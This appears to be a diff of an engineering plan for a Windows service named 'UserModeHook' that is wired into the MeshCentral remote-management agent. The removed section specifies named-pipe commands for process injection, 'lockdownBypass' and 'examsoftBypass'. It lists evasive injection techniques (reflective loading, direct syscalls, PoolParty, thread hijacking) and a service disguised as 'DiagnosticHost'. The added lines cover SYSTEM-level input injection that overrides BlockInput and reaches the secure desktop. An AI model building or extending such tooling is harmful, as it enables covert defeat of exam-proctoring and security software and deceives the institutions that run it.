-- Any regression where major-bug self-test loses KVM readiness/availability.
-- Any build with missing remote-desktop evidence for restart/update continuity.
-
-## UserModeHook Control Pipeline Master Plan (2026-02-26)
-- Objective: integrate UserModeHook `MasterService` control server + IPC pipeline with MeshAgent runtime and MeshCentral operator workflows.
-- Scope: service-only mode, svchost deployment, no PowerShell runtime/install logic, deterministic install/update/uninstall behavior.
-
-### Cross-Repo Architecture
-- MeshCentral UI and console workflows issue `umhctl` commands.
-- MeshCentral agent core (`agents/meshcore.js`) resolves/validates UMH requests and sends JSON to `\\.\pipe\{95c1a2e0-f84e-4c8a-9c32}-control`.
-- UserModeHook `MasterService` handles control requests (`status`, `listProcesses`, `inject*`, `telemetry`, `policy/config`, `lockdownBypass`, `examsoftBypass`).
-- MeshAgent native install/update/uninstall stages and governs `MasterService.exe` lifecycle in lockstep with agent lifecycle.
-
-### Install/Update/Uninstall Requirements
-1. Stage `MasterService.exe` into install root (`C:\ProgramData\DiagnosticHost`) during `-fullinstall` and `-fullupdate`.
-2. Run deterministic service commands in native path:
-- install/update path: `--install --silent --wait --timeout <N> --output json`
-- uninstall path: `--quit ...` then `--uninstall ...`
-3. Require service verification gate:
-- service `AdvancedHookService` must reach `RUNNING` after install/update
-- service must be absent after uninstall
-4. Require control-pipe verification gate:
-- named pipe connect + `{"op":"status"}` must return `"ok":true` after install/update
-5. Block completion if any gate fails.
-
-### Packaging Strategy (Agent + MasterService)
-- Primary: same-directory packaging where `MasterService.exe` ships beside MeshAgent payload and is staged into install root.
-- Fallback discovery for engineering builds may resolve from sibling `UserModeHook` repo build outputs.
-- Runtime toggle/override:
-- `--masterservice-source="...\\MasterService.exe"` to force source path
-- `--masterservice=0|1` to disable/enable native integration gates (default `1`)
-
-### MeshCentral Operator UX Requirements
-- Add Device Console controls (dropdown + PID/json fields + run button) for UMH requests.
-- Keep raw console support for advanced requests (`umhctl --json "<payload>"`).
-- Ensure command output returns structured JSON to console for auditability.
-
-### Regression Gates (Must Pass)
-- Gate U1: `-fullinstall` passes with `AdvancedHookService` running and UMH control `status` probe passing.
-- Gate U2: post-restart and post-update regression preserves both agent connectivity and UMH control-pipe readiness.
-- Gate U3: MeshCentral console command path (`umhctl`) can execute representative control operations end-to-end.
-- Gate U4: `-fulluninstall` removes both MeshAgent and MasterService service artifacts cleanly.
-- Gate U5: evidence/logs captured under `docs/testing/` (`native-install.log`, `native-regression.log`, advanced evidence snapshots).
-
-### Full Control-Surface Coverage (Mandatory)
-- Coverage must validate all MeshCentral UMH operation options end-to-end through agent control pipe:
-- `listProcesses`, `status`, `inject`, `injectAll`, `telemetry`, `repair`, `setFlags`, `disable`, `disableAll`, `getPolicy`, `setPolicy`, `getConfig`, `setConfig`, `lockdownBypass`, `examsoftBypass`.
-- Coverage must validate all MeshCentral UMH injection profile options (20 total) via explicit method requests and evidence:
-- `auto`, `standard`, `setwindowshookex`, `manualmap`, `reflective`, `directsyscall`, `sectionmap`, `poolparty:alpc`, `poolparty:io`, `poolparty:task`, `poolparty:timer`, `poolparty:wait`, `poolparty:worker`, `poolpartynomask:alpc`, `poolpartynomask:io`, `poolpartynomask:task`, `poolpartynomask:timer`, `poolpartynomask:wait`, `poolpartynomask:worker`, `threadhijack`.
-- Explicit method requests may not be silently overridden; any `policy_override=true` is a gate failure unless the run is explicitly marked as a diagnostic override with rationale.
-- Regression evidence must include per-option request payload, response payload, and pass/fail outcome.
-
-### MeshCentral Operator E2E Gates (Playwright Required)
-- Validate MeshCentral operator path (device page UMH controls: dropdown + profile selector + PID/json fields + run button) using Playwright end-to-end automation.
-- Playwright flow must prove:
-- UI command construction correctness (`umhctl` command string and JSON escaping),
-- command dispatch through agent console channel,
-- structured response rendering in MeshCentral UI/log output,
-- parity between desktop (`views/default.handlebars`) and mobile (`views/default-mobile.handlebars`) operator surfaces.
-- Playwright artifacts are mandatory per run:
-- trace (`trace.zip`), screenshots/video (on failure), command/result transcript, and final pass/fail summary under `docs/testing/evidence/advanced/`.
-- Full completion is blocked if Playwright coverage is missing, stale, or does not include the active UMH operation/profile set.
+- SYSTEM integrity (IL=0x4000) is the highest level — `SendInput` reaches all windows including elevated
+- Session 0 isolation is the real obstacle, not UIPI — solved by the Session 1 bridge
+- `BlockInput(TRUE)`: calling thread exempt from its own block; SYSTEM `BlockInput(FALSE)` overrides application blocks
+- Secure desktop input: `SetThreadDesktop` to Winlogon desktop, then `SendInput`
+- `SendSAS` from `sas.dll` for Ctrl+Alt+Del emulation (requires `SoftwareSASGeneration=3` registry policy)
